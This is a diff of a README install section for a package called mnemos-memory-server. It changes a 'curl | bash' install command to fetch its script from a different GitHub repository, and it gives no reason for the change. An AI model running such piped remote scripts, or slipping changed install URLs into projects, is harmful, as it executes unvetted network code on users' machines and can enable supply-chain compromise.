@@ -28,7 +28,7 @@ pipx install mnemos-memory-server
 Scripted variant (venv at `~/.mnemos/venv` + launcher in `~/.local/bin` + optional VS Code wiring):
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Korrnals/mnemos/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/vesmaro/vesmaro/main/scripts/install.sh | bash
 ```
 
 > ⚠️ The PyPI name is `mnemos-memory-server` — `pip install mnemos` installs an unrelated project.
